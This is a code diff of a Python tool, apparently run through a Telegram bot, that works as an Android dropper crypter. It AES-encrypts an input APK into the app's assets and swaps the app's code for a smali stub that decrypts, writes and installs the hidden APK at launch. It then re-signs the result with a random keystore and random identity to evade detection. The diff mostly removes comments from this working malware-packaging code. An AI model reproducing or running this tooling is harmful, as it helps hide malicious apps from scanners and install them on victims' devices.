@@ -35,7 +35,7 @@ def run_cmd(cmd, timeout=300):
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-# --------------- Smali Strings (NO BACKSLASH before .) ---------------
+# --------------- Smali Strings (NO BACKSLASH) ---------------
 STUB_APP = """.class public Ldropper/StubApp;
 .super Landroid/app/Application;
 
@@ -58,7 +58,7 @@ STUB_APP = """.class public Ldropper/StubApp;
     invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;
     move-result-object v2
     invoke-static {v2}, Ldropper/Util;->hexToBytes(Ljava/lang/String;)[B
-    move-result-object v3   # AES key
+    move-result-object v3
 
     const-string v4, "payload.enc"
     invoke-virtual {p0}, Ldropper/StubApp;->getAssets()Landroid/content/res/AssetManager;
@@ -66,7 +66,7 @@ STUB_APP = """.class public Ldropper/StubApp;
     invoke-virtual {v5, v4}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
     move-result-object v4
     invoke-static {v4}, Ldropper/Util;->readBytes(Ljava/io/InputStream;)[B
-    move-result-object v4  # encrypted APK
+    move-result-object v4
 
     const-string v5, "AES/ECB/PKCS5Padding"
     invoke-static {v5}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
@@ -77,7 +77,7 @@ STUB_APP = """.class public Ldropper/StubApp;
     const/4 v7, 0x2
     invoke-virtual {v5, v7, v6}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V
     invoke-virtual {v5, v4}, Ljavax/crypto/Cipher;->doFinal([B)[B
-    move-result-object v4  # decrypted APK
+    move-result-object v4
 
     const-string v6, "dropped.apk"
     const/4 v7, 0x0
@@ -86,7 +86,6 @@ STUB_APP = """.class public Ldropper/StubApp;
     invoke-virtual {v6, v4}, Ljava/io/FileOutputStream;->write([B)V
     invoke-virtual {v6}, Ljava/io/FileOutputStream;->close()V
 
-    # start installation
     new-instance v6, Ljava/io/File;
     invoke-virtual {p0}, Ldropper/StubApp;->getFilesDir()Ljava/io/File;
     move-result-object v7
@@ -183,7 +182,6 @@ STUB_UTIL = """.class public Ldropper/Util;
 .end method
 """
 
-# ---------------- Dropper Crypter Function ----------------
 def dropper_protect(input_apk: str, output_apk: str) -> bool:
     ensure_dirs()
     dec_dir = os.path.join(TEMP_DIR, 'dec_' + uuid.uuid4().hex[:6])
@@ -192,19 +190,16 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
     encrypted_apk = os.path.join(TEMP_DIR, 'payload.enc')
     ks_path = os.path.join(TEMP_DIR, 'rand.keystore')
 
-    # Decode original APK
     if not run_cmd(['apktool', 'd', '-f', '-o', dec_dir, input_apk], timeout=180):
         return False
 
     try:
-        # Read original package name from manifest
         manifest_path = os.path.join(dec_dir, 'AndroidManifest.xml')
         import xml.etree.ElementTree as ET
         tree = ET.parse(manifest_path)
         root = tree.getroot()
         package_name = root.attrib['package']
 
-        # Encrypt original APK
         key = os.urandom(16)
         key_hex = base64.b16encode(key).decode().lower()
         if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', input_apk, '-out', encrypted_apk], timeout=60):
@@ -216,28 +211,21 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
         with open(os.path.join(assets_dir, 'key.txt'), 'w') as f:
             f.write(key_hex)
 
-        # Remove original smali folders
         for item in os.listdir(dec_dir):
             if item.startswith('smali'):
                 shutil.rmtree(os.path.join(dec_dir, item), ignore_errors=True)
 
-        # Create stub smali
         stub_dir = os.path.join(dec_dir, 'smali', 'dropper')
         os.makedirs(stub_dir, exist_ok=True)
 
-        # Write stub files
         with open(os.path.join(stub_dir, 'StubApp.smali'), 'w') as f:
             f.write(STUB_APP)
         with open(os.path.join(stub_dir, 'Util.smali'), 'w') as f:
-            # Replace placeholder with actual package name
-            util_content = STUB_UTIL.replace('__PACKAGE__', package_name)
-            f.write(util_content)
+            f.write(STUB_UTIL.replace('__PACKAGE__', package_name))
 
-        # Modify manifest to use StubApp
         with open(manifest_path, 'r', encoding='utf-8') as f:
             manifest = f.read()
         manifest = manifest.replace('<application', '<application android:name="dropper.StubApp"')
-        # Add FileProvider inside <application>
         provider_entry = '''
         <provider
             android:name="androidx.core.content.FileProvider"
@@ -252,21 +240,16 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
         with open(manifest_path, 'w', encoding='utf-8') as f:
             f.write(manifest)
 
-        # Create file_paths.xml
         xml_dir = os.path.join(dec_dir, 'res', 'xml')
         os.makedirs(xml_dir, exist_ok=True)
         with open(os.path.join(xml_dir, 'file_paths.xml'), 'w') as f:
             f.write('<?xml version="1.0" encoding="utf-8"?>\n<paths>\n    <files-path name="internal" path="." />\n</paths>')
 
-        # Rebuild APK
         if not run_cmd(['apktool', 'b', '-o', rebuilt, dec_dir], timeout=180):
             return False
-
-        # Zipalign
         if not run_cmd(['zipalign', '-v', '-p', '4', rebuilt, aligned], timeout=60):
             return False
 
-        # Generate random keystore and sign
         ks_pass = random_string(12)
         alias = random_string(6)
         dname = f"CN={random_string(5)}, OU={random_string(4)}, O={random_string(5)}, L={random_string(6)}, ST={random_string(4)}, C={random.choice(['US','GB','IN'])}"
@@ -285,7 +268,6 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
             try: os.remove(f)
             except: pass
 
-# ... Telegram handlers unchanged ...
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_allowed(update.effective_user.id):
         await update.message.reply_text("Access denied.")
